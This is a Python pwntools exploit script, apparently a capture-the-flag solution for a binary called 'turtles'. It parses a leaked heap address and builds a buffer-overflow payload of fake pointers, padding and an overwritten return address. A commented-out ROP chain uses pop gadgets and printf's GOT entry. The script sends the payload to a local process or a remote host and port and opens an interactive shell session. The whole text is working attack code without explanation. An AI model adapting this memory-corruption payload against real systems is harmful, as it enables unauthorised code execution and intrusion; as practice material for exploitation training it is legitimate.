from pwn import *
import sys


def exploit(r, libc=None):
    pause()
    r.recvuntil('Turtle:')
    turtle_addr = int(r.recvline().strip(), 16)
    log.success('turtle @ {}'.format(hex(turtle_addr)))

    fmt = 0x400E72
    printf = 0x4009d0
    pop_rdi = 0x0000000000400d43
    pop_rsi_r15 = 0x0000000000400d41
    printf_got = 0x601090

    payload = ""
    payload += p64(turtle_addr + 0x8)
    payload += p64(turtle_addr + 0x10)
    payload += "A" * 56
    payload += p64(turtle_addr + 96)
    payload += p64(turtle_addr + 96)
    payload += "B" * 8
    payload += p64(0x400B84)
    # payload += p64(pop_rdi)
    # payload += p64(printf_got)
    # payload += p64(pop_rsi_r15)
    # payload += p64(fmt)
    # payload += p64(0xdeadbeef)
    # payload += p64(printf)

    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        # libc = ELF('')
        exploit(r)
    else:
        r = process(['./turtles'])
        # libc = ELF('')
        print util.proc.pidof(r)
        exploit(r)
